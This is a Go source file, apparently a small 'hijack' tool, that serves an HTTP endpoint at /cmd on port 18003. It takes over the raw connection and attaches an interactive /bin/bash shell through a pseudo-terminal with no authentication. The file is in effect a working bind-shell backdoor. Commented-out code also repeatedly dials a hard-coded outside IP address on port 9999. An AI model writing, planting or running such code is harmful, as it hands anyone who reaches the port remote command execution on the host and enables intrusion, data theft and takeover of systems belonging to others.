// hijack project main.go
package hijack

import (
	"fmt"
	//"github.com/docker/docker/pkg/term"
	"github.com/kr/pty"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"syscall"
	//"time"
)

type oswriter struct {
	cmd    net.Conn
	prefix string
}

func (t *oswriter) Write(b []byte) (int, error) {
	n, err := t.cmd.Write(b)
	hostname, _ := os.Hostname()
	t.cmd.Write([]byte("[" + hostname + "]# "))
	return n, err
}

func hijack(w http.ResponseWriter, r *http.Request) {
	fmt.Println("\033[41;36m /cmd \033[0m")
	conn, _, err := w.(http.Hijacker).Hijack()
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()
	ptyMaster, ptySlave, err := pty.Open()
	defer ptyMaster.Close()
	defer ptySlave.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	conn.Write([]byte("\n"))
	cmd := exec.Command("/bin/bash")
	//cmd.Env = []string{"/home/leejan/Soft/go/bin"}
	//fmt.Println(cmd.Env)
	//fmt.Println(syscall.Setsid())
	cmd.Dir = "/"
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true, Setctty: true}
	cmd.SysProcAttr.Pdeathsig = syscall.SIGKILL
	cmd.Stdin = ptySlave
	//cmd.Stderr = &oswriter{conn, "prefix"}
	cmd.Stderr = ptySlave
	cmd.Stdout = ptySlave

	//state, _ := term.SaveState(ptyMaster.Fd())
	//term.DisableEcho(ptyMaster.Fd(), state)
	go func() {
		io.Copy(ptyMaster, conn)

	}()
	go func() {
		io.Copy(conn, ptyMaster)

	}()
	//cmd.Run()
	cmd.Start()
	//err = syscall.PtraceAttach(cmd.Process.Pid)
	//if err != nil {
	//	fmt.Println(err)
	//}
	cmd.Wait()

	//cmd.Run()
	//go func() {
	//	_, err = io.Copy(os.Stdout, conn)
	//	if err != nil {
	//		fmt.Println(err)
	//		return
	//	}
	//}()
	//_, err = io.Copy(bw, os.Stdin)
	//if err != nil {
	//	fmt.Println(err)
	//	return
	//}
	fmt.Println("end")
	return
}

func Main() {
	//syscall.Umask(0)
	//fmt.Println(syscall.Setsid())
	http.HandleFunc("/cmd", hijack)

	//go func() {
	//	for {
	//		laddr, _ := net.ResolveTCPAddr("tcp", ":18003")
	//		raddr, _ := net.ResolveTCPAddr("tcp", "180.175.173.166:9999")
	//		net.DialTCP("tcp", laddr, raddr)
	//		//net.Dial("tcp", "180.175.173.166:9999")
	//		time.Sleep(time.Second * 2)
	//	}

	//}()

	//laddr, _ := net.ResolveTCPAddr("tcp", ":19998")
	//con, _ := net.ListenTCP("tcp", laddr)
	//http.Serve(con, nil)
	http.ListenAndServe(":18003", nil)
	fmt.Println("Hello World!")
}
